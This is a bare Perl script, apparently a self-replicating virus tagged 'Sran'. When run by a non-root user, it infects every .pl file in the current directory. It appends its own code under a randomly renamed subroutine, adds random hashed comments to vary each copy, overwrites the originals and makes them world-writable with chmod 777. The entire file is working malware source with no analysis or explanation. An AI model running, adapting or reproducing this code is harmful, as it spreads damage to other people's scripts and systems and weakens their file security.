#!/usr/bin/perl -X
#!Sran

qwerty();

sub qwerty {

    goto b if($ENV{"USER"} eq "root");
    
a: while (<*.pl>)
    {
	my $oF = "qwerty";
	my $tN = crypt($_, $_), $cW = 0; $oN = "./$_", $nF = $tN;

	open (WE, "<$0");					
	open (IF, "<$_");
	open (TMP, ">$tN");					
	
	    $nF =~ s/[0-9.\/].*/a/;
	
	    while (<IF>) 
	    {
		chomp;
		if (/\#!Sran/) { unlink ($tN); next a }		
		elsif (!/#!\//) { print TMP "$_\n" }
		else { if(!/-X/){$_ .= " -X"} print TMP "$_\n#!Sran\n$nF();\n" }		
	    }
	    
	    while (<WE>)
	    {
		$st = "";
		
		s/#[\d].*/$st/;
		if (/sub $oF/ || /my \$oF =/) { $cW = 1; s/$oF/$nF/}
		next if (/#!\// || /$oF();/ || !$cW);
		if (int(rand(2))) { $st=" #".crypt($tN, rand(256)) }
		else {$st = ""}
		
		chomp;
		print TMP "$_$st\n";
	    }
	
	unlink ($oN);
	rename ($tN, $oN);
	chmod (0777, $oN);
    }
b:
}